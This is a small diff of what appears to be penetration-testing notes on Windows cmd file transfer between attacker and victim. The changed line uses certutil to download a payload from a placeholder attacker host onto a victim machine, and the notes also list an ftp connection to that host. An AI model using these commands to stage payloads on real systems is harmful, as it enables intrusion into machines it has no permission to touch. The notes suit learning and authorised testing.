@@ -15,7 +15,7 @@
 
 - cmd
   - transfer files between attacker and victim and vice versa
-    - `certutil -urlcache -f http://attacker-IP/path/to/payload.exe payload.exe`
+    - `certutil -urlcache -f http://attacker-IP/path/to/payload payload`
       - download file to victim
     - `ftp attacker-IP`
       - connect to FTP server, to download/upload files
